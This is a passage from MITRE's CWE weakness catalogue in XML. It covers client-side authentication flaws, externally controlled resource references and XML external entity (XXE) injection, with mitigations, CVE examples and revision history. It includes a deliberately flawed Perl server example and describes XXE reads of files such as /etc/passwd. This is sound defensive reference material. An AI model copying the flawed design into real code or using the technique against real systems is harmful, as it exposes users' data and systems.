            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If some degree of trust is required between the two entities, then use integrity checking and strong authentication to ensure that the inputs are coming from a trusted source. Design the product so that this trust is managed in a centralized fashion, especially if there are complex or numerous communication channels, in order to reduce the risks that the implementer will mistakenly omit a check in a single code path.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example contains client-side code that checks if the user authenticated successfully before sending a command. The server-side code performs the authentication in one step, and executes the command in a separate step.</Intro_Text>
               <Body_Text>CLIENT-SIDE (client.pl)</Body_Text>
               <Example_Code Nature="Good" Language="Perl">
                  <xhtml:div>$server = "server.example.com";<xhtml:br/>$username = AskForUserName();<xhtml:br/>$password = AskForPassword();<xhtml:br/>$address = AskForAddress();<xhtml:br/>$sock = OpenSocket($server, 1234);<xhtml:br/>writeSocket($sock, "AUTH $username $password\n");<xhtml:br/>$resp = readSocket($sock);<xhtml:br/>if ($resp eq "success") {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i># username/pass is valid, go ahead and update the info!</xhtml:i>
                           <xhtml:br/>writeSocket($sock, "CHANGE-ADDRESS $username $address\n";</xhtml:div>
                     </xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">print "ERROR: Invalid Authentication!\n";</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>SERVER-SIDE (server.pl):</Body_Text>
               <Example_Code Nature="Bad">
                  <xhtml:div>$sock = acceptSocket(1234);<xhtml:br/>($cmd, $args) = ParseClientRequest($sock);<xhtml:br/>if ($cmd eq "AUTH") {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>($username, $pass) = split(/\s+/, $args, 2);<xhtml:br/>$result = AuthenticateUser($username, $pass);<xhtml:br/>writeSocket($sock, "$result\n");<xhtml:br/>
                           <xhtml:i># does not close the socket on failure; assumes the</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># user will try again</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>elsif ($cmd eq "CHANGE-ADDRESS") {<xhtml:div style="margin-left:1em;">if (validateAddress($args)) {<xhtml:div style="margin-left:1em;">$res = UpdateDatabaseRecord($username, "address", $args);<xhtml:br/>writeSocket($sock, "SUCCESS\n");</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">writeSocket($sock, "FAILURE -- address is malformed\n");</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The server accepts 2 commands, "AUTH" which authenticates the user, and "CHANGE-ADDRESS" which updates the address field for the username. The client performs the authentication and only sends a CHANGE-ADDRESS for that user if the authentication succeeds. Because the client has already performed the authentication, the server assumes that the username in the CHANGE-ADDRESS is the same as the authenticated user. An attacker could modify the client by removing the code that sends the "AUTH" command and simply executing the CHANGE-ADDRESS.</Body_Text>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors used client-side authentication in their OT products.</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-33139</Reference>
               <Description>SCADA system only uses client-side authentication, allowing adversaries to impersonate other users.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-33139</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6994</Reference>
               <Description>ASP program allows upload of .asp files by bypassing client-side checks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6994</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-0163</Reference>
               <Description>steganography products embed password information in the carrier file, which can be extracted from a modified client.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-0163</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-0164</Reference>
               <Description>steganography products embed password information in the carrier file, which can be extracted from a modified client.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-0164</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-0100</Reference>
               <Description>client allows server to modify client's configuration and overwrite arbitrary files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-0100</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="162"/>
            <Related_Attack_Pattern CAPEC_ID="202"/>
            <Related_Attack_Pattern CAPEC_ID="207"/>
            <Related_Attack_Pattern CAPEC_ID="208"/>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="383"/>
            <Related_Attack_Pattern CAPEC_ID="384"/>
            <Related_Attack_Pattern CAPEC_ID="385"/>
            <Related_Attack_Pattern CAPEC_ID="386"/>
            <Related_Attack_Pattern CAPEC_ID="387"/>
            <Related_Attack_Pattern CAPEC_ID="388"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 23, &#34;Client-Side Security Is an Oxymoron&#34; Page 687"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2007-05-07</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships, Research_Gaps, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Enabling_Factors_for_Exploitation, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships, Type</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Client-Side Enforcement of Server-Side Security</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Design Principle Violation: Client-Side Enforcement of Server-Side Security</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="610" Name="Externally Controlled Reference to a Resource in Another Sphere" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="219"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">This is a general class of weakness, but most research is focused on more specialized cases, such as path traversal (CWE-22) and symlink following (CWE-61). A symbolic link has a name; in general, it appears like any other file in the file system. However, the link includes a reference to another file, often in another directory - perhaps in another sphere of control. Many common library functions that accept filenames will "follow" a symbolic link and use the link's target instead.</Note>
            <Note Type="Maintenance">The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 "Resource Injection," as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the "identifier used to access a system resource" such as a file name or port number, yet it explicitly states that the "resource injection" term does not apply to "path manipulation," which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2007-05-07</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Externally Controlled Reference to an Internal Resource</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="611" Name="Improper Restriction of XML External Entity Reference" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.</Description>
         <Extended_Description>
            <xhtml:p>XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing.</xhtml:p>
            <xhtml:p>By submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as "file:///c:/winnt/win.ini" designates (in Windows) the file C:\Winnt\win.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning.</xhtml:p>
            <xhtml:p>Once the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="441" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="XML" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>XXE</Term>
               <Description>An acronym used for the term "XML eXternal Entities"</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Note>The product could consume excessive CPU cycles or memory using a URI that points to a large file, or a device that always returns data such as /dev/random. Alternately, the URI could reference a file that contains many nested or recursive entity references to further slow down parsing.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>System Configuration</Phase>
               <Description>Many XML parsers and validators can be configured to disable external entity expansion.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-1306</Reference>
               <Description>A browser control can allow remote attackers to determine the existence of files via Javascript containing XML script.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1306</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5656</Reference>
               <Description>XXE during SVG image conversion</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5656</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-2239</Reference>
               <Description>XXE in PHP application allows reading the application's configuration file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-2239</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3489</Reference>
               <Description>XXE in database server</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-3489</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-4399</Reference>
               <Description>XXE in rapid web application development framework allows reading arbitrary files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-4399</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3363</Reference>
               <Description>XXE via XML-RPC request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-3363</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0037</Reference>
               <Description>XXE in office document product using RDF.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-0037</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-4107</Reference>
               <Description>XXE in web-based administration tool for database.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-4107</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-3322</Reference>
               <Description>XXE in product that performs large-scale data analysis.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-3322</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1699</Reference>
               <Description>XXE in XSL stylesheet functionality in a common library used by some web browsers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1699</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>43</Entry_ID>
               <Entry_Name>XML External Entities</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="221"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-496"/>
            <Reference External_Reference_ID="REF-497"/>
            <Reference External_Reference_ID="REF-498"/>
            <Reference External_Reference_ID="REF-499"/>
            <Reference External_Reference_ID="REF-500"/>
            <Reference External_Reference_ID="REF-501"/>
         </References>
         <Notes>
            <Note Type="Relationship">CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the "Server" portion of the SSRF acronym does not necessarily apply.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2007-05-07</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Background_Details, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Description, Name, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships, Relevant_Properties</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Name, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Common_Consequences, Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through XML External Entity File Disclosure</Previous_Entry_Name>
